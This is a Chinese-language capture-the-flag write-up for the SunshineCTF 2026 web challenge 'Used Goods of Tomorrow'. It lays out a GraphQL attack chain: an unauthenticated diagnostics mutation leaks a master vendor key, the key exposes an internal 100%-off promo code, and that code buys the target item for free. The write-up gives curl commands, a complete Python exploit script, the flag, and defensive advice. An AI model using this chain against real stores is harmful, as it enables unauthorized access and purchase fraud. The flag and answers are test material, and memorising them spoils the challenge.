# used-goods-of-tomorrow 题解与完整复现

| 项 | 值 |
|---|---|
| 比赛 | SunshineCTF 2026 |
| 类别 | Web |
| 题目 | Used Goods of Tomorrow（站点标题 TOMORROW-MART） |
| 远程实例 | `https://usedgoods.web.2026.sunshinectf.games/`（分析期间存活；nginx + HTTP/2） |
| 解题状态 | 已解出（两个独立账号复现，flag 稳定） |
| flag | `sun{1_l0v3_fr33_stuff}` |
| 分析方式 | 纯黑盒（线上唯一，无源码附件；全部结论来自实际请求响应） |
| 分析时间 | 2026-09-27 |

> 名词说明：**flag** 指比赛的最终目标字符串（本题格式为 `sun{...}`），拿到它就代表解出本题。**GraphQL** 是一种 API 查询语言：客户端用一条 JSON 请求（query / mutation）精确描述要读、要改什么数据，服务端按 schema（类型系统）执行。其中 **query** 是"读操作"，**mutation** 是"写操作"。**BFLA**（Broken Function Level Authorization，功能级授权缺失）指"接口本身存在，但没做权限检查，谁都能调"。

## 目录

- [一、这道题在做什么](#一这道题在做什么)
- [二、攻击链总览](#二攻击链总览)
- [三、完整复现](#三完整复现)
- [四、复现脚本](#四复现脚本)
- [五、防御建议](#五防御建议)
- [六、总结](#六总结)
- [附录：原始证据](#附录原始证据)

## 一、这道题在做什么

题面：太空时代的二手市场 Tomorrow-Mart 与 FutureBank 合作，新用户注册送 500 credits；"谁会第一个成为百万富翁，买下 Founders' Vault 的地契？"

站点是一个商店：主页列出 5 件商品，其中 Lot #4042「Founders' Vault Deed」售价 **1,000,000 credits**，其余商品 45～380 credits；新账号只有 **500 credits**。按正常玩法攒 1M 遥遥无期，而前端 `/static/app.js` 显示全部业务走 `POST /graphql`，认证用 `Authorization: Bearer <token>`。枚举 GraphQL schema 后目标就很清楚：`Receipt` 类型自带 `flag` 字段，**买下 Lot #4042 的收据里直接回 flag**。题目的实质是：绕过余额校验，以 0 代价成交。

### 商品清单（`listings` 查询实测）

| Lot | 商品 | 价格（credits） |
|---|---|---|
| 1001 | Pre-Owned Atomic Toaster | 45 |
| 1002 | Refurbished Hover-Scooter | 220 |
| 1003 | Vintage Vacuum-Tube Pocket Televisor | 80 |
| 1004 | Personal Jetpack (slightly singed) | 380 |
| 4042 | **LOT #4042 — Founders' Vault Deed (SEALED)** | **1,000,000** |

### 接口清单（introspection 实测）

| 接口 | 类型 | 参数 | 认证 | 说明 |
|---|---|---|---|---|
| `register` | mutation | username, password | 无需 | 注册，送 500 credits |
| `login` | mutation | username, password | 无需 | 登录，返回 token |
| `myAccount` | query | - | 需要 | 查余额 |
| `listings` / `listing(id)` | query | id | 无需 | 商品列表/详情 |
| `placeOrder` | mutation | listingId, **promoCode（可选）** | 需要 | 下单，Receipt 含 `flag` |
| `promoCodes` | query | **vendorKey（必填）** | 无需（其实需要特权 key） | 查优惠码 |
| `vendorTerminalSync` | mutation | terminalId（可选） | **完全无认证** | 供应商终端诊断 |

## 二、攻击链总览

三个漏洞点串成一条链，核心是"越权的诊断接口泄露特权密钥 → 特权密钥拉取内部优惠码 → 内部优惠码 100% off 买下目标商品"：

```
[任意匿名用户]
   │ ① mutation vendorTerminalSync（无认证！）
   ▼
VendorDiagnostics.vendorKey = VND-MASTER-21d5f80206dffb6fa9ad5722   ← 泄露 master 密钥
   │ ② query promoCodes(vendorKey: "VND-MASTER-...")
   ▼
内部优惠码清单：FOUNDERS-100（4042 专用，100% off，"Internal use only"）
   │ ③ mutation placeOrder(listingId: "4042", promoCode: "FOUNDERS-100")
   ▼
Receipt { success: true, pricePaid: 0, flag: "sun{1_l0v3_fr33_stuff}" }
```

对应漏洞类型：

1. **未授权功能级访问（BFLA）**：供应商终端诊断 mutation 未做认证，任何匿名用户可调；
2. **敏感信息泄露**：诊断接口返回 master vendorKey，即服务端"终端认证"的唯一凭证；
3. **业务逻辑绕过**：内部 100% 折扣码可被任意顾客使用，0 元买下本应"百万富翁"才能购得的目标商品。

## 三、完整复现

### 3.1 信息收集：站点与 API 结构

```bash
curl -sk https://usedgoods.web.2026.sunshinectf.games/            # 主页：静态 HTML，商品卡片带 data-id
curl -sk https://usedgoods.web.2026.sunshinectf.games/static/app.js
curl -sk https://usedgoods.web.2026.sunshinectf.games/account     # 注册/登录页
curl -sk https://usedgoods.web.2026.sunshinectf.games/checkout    # 结算页
```

`app.js` 给出全部关键信息：GraphQL 端点为 `/graphql`；请求头 `Content-Type: application/json`；登录后把返回的 `token` 存进 localStorage 并以 `Authorization: Bearer <token>` 携带。

### 3.2 Schema 枚举（introspection 未禁用）

```bash
curl -sk -X POST https://usedgoods.web.2026.sunshinectf.games/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ __schema { queryType { fields { name } } mutationType { fields { name args { name } } } } }"}'
```

返回全部 query / mutation 名称与参数（接口清单见第一章表）。三个值得注意的类型：

- `PromoCode { code, description, percentOff, appliesTo }`：其中 `percentOff` 是可直接滥用的数值型折扣；
- `VendorDiagnostics { terminalId, status, firmware, vendorKey, note }`：**直接把 vendorKey 放进返回类型**；
- `Receipt { success, message, listingId, pricePaid, flag }`：**flag 就在购买收据里**。

### 3.3 漏洞点①：诊断 mutation 未授权泄露 master vendorKey

`vendorTerminalSync` 属于 Mutation，且 `terminalId` 可省略。以匿名身份（不带任何 token）直接调用：

```graphql
mutation { vendorTerminalSync { terminalId status firmware vendorKey note } }
```

响应：

```json
{"data":{"vendorTerminalSync":{
  "firmware":"vterm-beta-0.9.7",
  "note":"Diagnostics nominal. Remember to disable this endpoint before public launch.",
  "status":"ONLINE",
  "terminalId":"TERM-00",
  "vendorKey":"VND-MASTER-21d5f80206dffb6fa9ad5722"}}}
```

要点：

- 完全无认证，匿名可调（`terminalId` 省略/"1"/""三种调用都成功，均返回同一 master key）；
- `note` 字段自述 **"Remember to disable this endpoint before public launch."**：开发者自己知道这是没关的调试入口；
- 泄露的 key 前缀 `VND-MASTER` 表明它不止能"认证某台终端"，而是主密钥。

### 3.4 漏洞点②：master key 拉取内部优惠码

`promoCodes(vendorKey)` 名义上"限制给已认证供应商终端"，但拿到 master key 后即等同特权：

```graphql
query { promoCodes(vendorKey: "VND-MASTER-21d5f80206dffb6fa9ad5722") {
  code description percentOff appliesTo } }
```

响应（3 条码全量泄露）：

| code | percentOff | appliesTo | description |
|---|---|---|---|
| SCOUT-10 | 10 | 任意 | New-scout welcome bonus: 10% off any single listing. |
| ATOMIC-25 | 25 | 1001 | Appliance clearance: 25% off the Atomic Toaster. |
| **FOUNDERS-100** | **100** | **4042** | **Founders' comp — 100% off Lot #4042. Internal use only.** |

反例对照：错误 vendorKey 被服务端正确拒绝：`"Vendor master key rejected. promoCodes is restricted to authenticated vendor terminals."`。说明 master key 是真特权凭证，不是"谁都能过"。

### 3.5 漏洞点③：内部 100% 优惠码 0 元购拿 flag

`placeOrder` 接受可选 `promoCode` 参数，且没有对"内部码是否允许顾客使用"做任何校验：

```graphql
mutation { placeOrder(listingId: "4042", promoCode: "FOUNDERS-100") {
  success message listingId pricePaid flag } }
```

响应：

```json
{"data":{"placeOrder":{
  "flag":"sun{1_l0v3_fr33_stuff}",
  "listingId":"4042",
  "message":"Order settled. “LOT #4042 — Founders’ Vault Deed (SEALED)” is yours for 0 credits. Promo FOUNDERS-100 applied (-100%). ...",
  "pricePaid":0,
  "success":true}}}
```

1,000,000 × (1 − 100%) = **0 credits**，余额校验形同虚设，收据直接带回 flag。

### 3.6 反例对照（证明"哪里该拦、哪里没拦"）

| 测试 | 结果 | 说明 |
|---|---|---|
| 无 promoCode 购买 4042 | `success:false`，"insufficient credits (balance 500, order total 1000000)" | 正常余额校验确实工作 |
| 错误 vendorKey 查码 | `"Vendor master key rejected..."` | 特权 key 校验确实工作 |
| 匿名调 `vendorTerminalSync` | 成功返回 master key | **该拦的没拦（漏洞①）** |
| 顾客用 `FOUNDERS-100` 下单 | 0 元成交 + flag | **该拦的没拦（漏洞③）** |

### 3.7 复现验证

用第二个独立账号重走全链（注册 → vendorTerminalSync → promoCodes → placeOrder），得到同一 flag `sun{1_l0v3_fr33_stuff}`，链路稳定可复现。

## 四、复现脚本

完整独立脚本（仅依赖 `requests`；匿名 + 注册两种身份均可完成第 1、2 步，第 3 步需任意注册账号）：

```python
#!/usr/bin/env python3
"""SunshineCTF 2026 - Used Goods of Tomorrow: 0-cost purchase of Lot #4042."""
import secrets
import requests

BASE = "https://usedgoods.web.2026.sunshinectf.games"

def gql(query, variables=None, token=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    r = requests.post(BASE + "/graphql", headers=headers,
                      json={"query": query, "variables": variables or {}}, timeout=30)
    return r.json()

# ① 未授权诊断：匿名拿 master vendorKey
diag = gql('mutation { vendorTerminalSync { vendorKey note } }')["data"]["vendorTerminalSync"]
vendor_key = diag["vendorKey"]
print("[1] vendorKey =", vendor_key, "|", diag["note"])

# ② 用 master key 拉全部优惠码（含内部 100% off 码）
codes = gql('query($k:String!){ promoCodes(vendorKey:$k){ code percentOff appliesTo } }',
            {"k": vendor_key})["data"]["promoCodes"]
for c in codes:
    print("[2] promo:", c)
founders = next(c for c in codes if c["appliesTo"] == "4042")

# ③ 注册任意账号，用内部码 0 元购目标商品
user = "scout_" + secrets.token_hex(4)
auth = gql('mutation($u:String!,$p:String!){register(username:$u,password:$p){token}}',
           {"u": user, "p": secrets.token_hex(8)})["data"]["register"]
order = gql('mutation($id:ID!,$p:String){placeOrder(listingId:$id,promoCode:$p){success pricePaid flag}}',
            {"id": "4042", "p": founders["code"]}, token=auth["token"])["data"]["placeOrder"]
print("[3] pricePaid =", order["pricePaid"])
print("[+] FLAG =", order["flag"])
```

预期输出：

```
[1] vendorKey = VND-MASTER-21d5f80206dffb6fa9ad5722 | Diagnostics nominal. Remember to disable this endpoint before public launch.
[2] promo: {'appliesTo': None, 'code': 'SCOUT-10', 'percentOff': 10}
[2] promo: {'appliesTo': '1001', 'code': 'ATOMIC-25', 'percentOff': 25}
[2] promo: {'appliesTo': '4042', 'code': 'FOUNDERS-100', 'percentOff': 100}
[3] pricePaid = 0
[+] FLAG = sun{1_l0v3_fr33_stuff}
```

## 五、防御建议

1. **给所有"内部/调试/供应商"接口加认证与授权**：GraphQL 中逐字段（per-field）授权：`vendorTerminalSync` 应要求终端认证或直接下线（`note` 自己都写了 "disable this endpoint before public launch"）；
2. **密钥不出域**：vendorKey 属于服务端凭证，不应出现在任何响应类型的字段里（`VendorDiagnostics.vendorKey` 字段本身就该删）；
3. **对特权数据二次校验**：`promoCodes` 的返回应限定"该终端可用的公开码"，内部码（`percentOff` ≥ 阈值 / 标注 Internal）不应对非内部身份可见；
4. **折扣逻辑加护栏**：服务端校验优惠码的适用范围与使用者身份（内部码需内部身份）；折扣后价格下限钳制（≥0），避免负数/超额折扣；关键商品不允许叠加内部码；
5. **上线前回归检查**：`introspection` 是否该开随题设定，但所有 mutation 必须无认证逐个过一遍（本链根因即"mutation 漏加 auth"）。

## 六、总结

**核心教训**：三个漏洞都不是高深技巧，而是三种常见的授权缺失叠在一起：调试/内部接口忘了加认证、特权凭证被放进响应字段、特权数据（内部折扣码）对普通用户开放。解题动作本身只有三次 GraphQL 调用：枚举 schema 找可疑接口、逐个测"不登录能不能调"、顺着泄露的凭证把特权数据变成绕过余额校验的钥匙。这类题通用的检查顺序是：**先枚举全部接口（含隐藏字段），再逐接口做无认证调用**，而不是只盯着前端页面找输入端。

**攻击链回顾**：`vendorTerminalSync`（无认证）泄露 master vendorKey → `promoCodes(vendorKey)` 列出内部 100% off 码 → `placeOrder(4042, FOUNDERS-100)` 以 0 credits 买下目标商品，收据里的 `flag` 字段即答案。反例对照（无码购买被余额校验拦截、错误 vendorKey 被拒）说明漏洞边界在"授权"而不在"业务逻辑本身"。

**工具链**：`curl`（现场探测与逐条重放，见 3.1 与附录）；Python `requests`（完整可复现脚本，见第四章）。全程无需特殊工具，GraphQL introspection 输出本身就是"接口文档"。

## 附录：原始证据

全部原始响应存于本次任务目录（`~/bw-security-analysis/workspace/20260927_160838_e8ba_web-analysis/evidence/`）：

| 文件 | 内容 |
|---|---|
| `exploit_responses.json` | 三步攻击链 + 反例对照的完整请求/响应（逐字） |
| `schema_full.json` / `schema_types.json` | introspection 原始输出（全部类型/字段/参数） |
| `app.js` / `index.html` / `account.html` / `checkout.html` | 前端页面与脚本存档 |

关键请求（可逐条重放）：

```bash
# ① 匿名泄露 master key
curl -sk -X POST https://usedgoods.web.2026.sunshinectf.games/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { vendorTerminalSync { vendorKey note } }"}'

# ② 拉取内部优惠码
curl -sk -X POST https://usedgoods.web.2026.sunshinectf.games/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"query { promoCodes(vendorKey: \"VND-MASTER-21d5f80206dffb6fa9ad5722\") { code percentOff appliesTo } }"}'

# ③ 0 元购（需任意账号 token），拿到 flag
curl -sk -X POST https://usedgoods.web.2026.sunshinectf.games/graphql \
  -H 'Content-Type: application/json' \
  -H 'Authorization: Bearer <你的 token>' \
  -d '{"query":"mutation { placeOrder(listingId: \"4042\", promoCode: \"FOUNDERS-100\") { success pricePaid flag } }"}'
```
